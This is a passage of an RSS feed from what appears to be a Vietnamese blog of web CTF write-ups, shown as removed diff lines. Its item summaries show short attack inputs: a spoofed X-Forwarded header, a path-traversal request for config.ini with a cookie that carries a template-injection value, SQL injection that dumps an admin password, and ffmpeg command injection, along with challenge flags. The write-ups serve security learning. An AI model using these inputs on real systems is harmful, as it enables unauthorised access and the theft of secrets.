-Có thể thấy ipv6 của ta ở đây (vậy làm sao để bypass cho hệ thống nghĩ mình nằm trong LAN)
-Mình thử với header X-Forwarded-X: 127.0.0.1 -&amp;gt; server thông báo ip mình là 127.0.0.1 nhưng vẫn chưa cùng side với LAN</description>
-    </item>
-    
-    <item>
-      <title>SVATTT 2024 Quals - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-10-09-svattt-2024-quals/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-10-09-svattt-2024-quals/</guid>
-      <description>SVATTT 2024 Quals Path travesal we don&amp;rsquo;t talk any more:
-GET /pageaccount?file=config.ini HTTP/1.1Host: 183.91.11.30:15000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeCookie: session=eyJvdHAiOiI0ODQ3IiwidXNlcm5hbWUiOiJ7e3NldHRpbmdzLlNFQ1JFVF9LRVl9fSJ9.ZwDT7w.1T2kG_8AVg1wYQv4nxJsGMxUyuQUpgrade-Insecure-Requests: 1Priority: u=0, iflag: ASCIS{bWlzb2Z0MjAyNA==}
-SQL sql injection mysql -&amp;gt; dump database leak pass admin is 123456 -&amp;gt; login -&amp;gt; recevie flag
-flag: ASCIS{s1mpl3st_sql_1n_th3_w0rld}
-DigitalGadget https://blog.yulun.ac.cn/posts/2023/fuzzing-mathtex/#bug-1---command-injection-cve-2023-51887
-https://github.com/shine102/CTF-Writeups/blob/main/ASCIS2024/Web/README.md</description>
-    </item>
-    
-    <item>
-      <title>Tamus CTF 2024 - some WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-04-06-tamusctf2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-04-06-tamusctf2024/</guid>
-      <description>WEB challs forgotten-password  Bài này cũng có thể nói là một trick dùng phising và viết bằng RUBY- oke view qua source của nó tí nào(mình đọc cả buổi chiều :)))    Nhìn có vẻ loằng ngoằng thì mình giải thích một chút nha.
-  Đầu tiên vào trong trang web có chức năng đăng nhập. Và sever khum cung cấp mật khẩu cho mình vì vậy mình phải forget-password để sever gửi mail vào tài khoản của mình.</description>
-    </item>
-    
-    <item>
-      <title>UofTCTF 2024 - Full WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-01-14-uoftctf2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-01-14-uoftctf2024/</guid>
-      <description>WEB challs Voice change đề bài : Voice Changer vul : command injection
-When you go to the page you will see Flow : click to the micro will record voice Input pitch is fast or slow @@ after submit your voice will receive
-$ ffmpeg -i &amp;quot;/app/upload/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&amp;quot; -y -af &amp;quot;asetrate=44100*1,aresample=44100,atempo=1/1&amp;quot; &amp;quot;/app/output/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&amp;quot; ffmpeg version 6.1 Copyright (c) 2000-2023 the FFmpeg developers built with gcc 13.2.1 (Alpine 13.2.1_git20231014) 20231014 configuration: --prefix=/usr --disable-librtmp --disable-lzma --disable-static --disable-stripping --enable-avfilter --enable-gpl --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libdav1d --enable-libdrm --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libharfbuzz --enable-libmp3lame --enable-libopenmpt --enable-libopus --enable-libplacebo --enable-libpulse --enable-librav1e --enable-librist --enable-libsoxr --enable-libsrt --enable-libssh --enable-libtheora --enable-libv4l2 --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxcb --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-lto=auto --enable-lv2 --enable-openssl --enable-pic --enable-postproc --enable-pthreads --enable-shared --enable-vaapi --enable-vdpau --enable-version3 --enable-vulkan --optflags=-O3 --enable-libjxl --enable-libsvtav1 --enable-libvpl libavutil 58.</description>
-    </item>
-    
-    <item>
-      <title>vsCTF2024 - WEB &#39;s challenges</title>
-      <link>https://l3mnt2010.github.io/write-up/2024-06-16-vsctf2024/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>llam16219@gmail.com (l3mnt2010)</author>
-      <guid>https://l3mnt2010.github.io/write-up/2024-06-16-vsctf2024/</guid>
-      <description>vsCTF 2024 vsCTF 2024 WRITE UP</description>
-    </item>
-    
-  </channel>
-</rss>
